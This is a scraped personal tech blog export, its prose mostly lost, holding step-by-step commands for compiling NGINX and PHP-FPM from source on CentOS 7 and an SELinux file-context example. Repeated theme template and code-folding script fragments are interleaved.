  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

Post.title: NGINX
Post._content:
### NGINX

centos8yumyumNGINX8

Centos7Centos7yumNGINX

<!-- more -->

[nginx](https://pan.baidu.com/s/1hjUud-D1Du-s-dbFAGJxTQ?pwd=46k1)

46k1

* 

```bash
tar -zxf nginx-1.17.10.tar.gz
```

* 

```bash
yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel
```

* configure

```bash
./configure --prefix=/usr/local/nginx --with-http_ssl_module
```

* 

```bash
make
make install
```

NGINX`/usr/local/nginx/sbin/nginx`

NGINX

```bash
/usr/local/nginx/sbin/nginx
```



```bash
cp /usr/local/nginx/sbin/nginx /sbin/nginx
```

NGINX

```bash
nginx # nginx
nginx -s reload # nginx
nginx -s stop # nginx
```

80

```bash
lsof -i:80
```

NGINXNGINX`cd /usr/local/nginx/conf`

```bash
egrep -v "^[[:space:]]*#|^$" nginx.conf.default > nginx.conf
```

{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

Post._content:
### PHP

Centos7Centos8Centos8yumphpphp-fpm`php-fpm start`Centos8PHP

<!-- more -->

[PHP](https://pan.baidu.com/s/1njY-HAXimp8635W3pe6JEw?pwd=ba1u)

ba1u

* 

```bash
tar -zxf php-5.6.17.tar.gz
```

* 

```bash
yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel
yum install -y libxml2 libxml2-devel
```

[NGINX](https://nustarain.gitee.io/2023/07/04/nginx/)NGINXyum

* configure

```bash
./configure --prefix=/usr/local/php --enable-mbstring --enable-fpm --with-mysql --with-mysqli
```

* 

```bash
make  # make
make install
```

* 

```bash
cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf
```

* 

```bash
cp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm
```

* 

```bash
chmod +x /etc/init.d/php-fpm
```

* 

```bash
cp /etc/init.d/php-fpm /sbin/php-fpm
```

PHP

```bash
php-fpm start
php-fpm reload
php-fpm stop
```
* 

```bash
lsof -i:9000
```

<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

### SELinux

#### selinux`/home/student`selinux`/root`selinux

 * studentselinux

```bash
[root@servera home]# ls -dZ student/
unconfined_u:object_r:user_home_dir_t:s0 student/
```

<!-- more -->

**user_home_dir_t**`/home/student`selinux

 * rootselinux

```bash
[root@servera /]# ls -Zd /root/
system_u:object_r:admin_home_t:s0 /root/
```

**admin_home_t**`/root`selinux

* 

```bash
[root@servera /]# semanage fcontext -a -t admin_home_t '/home/student(/.*)?'
```


{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>
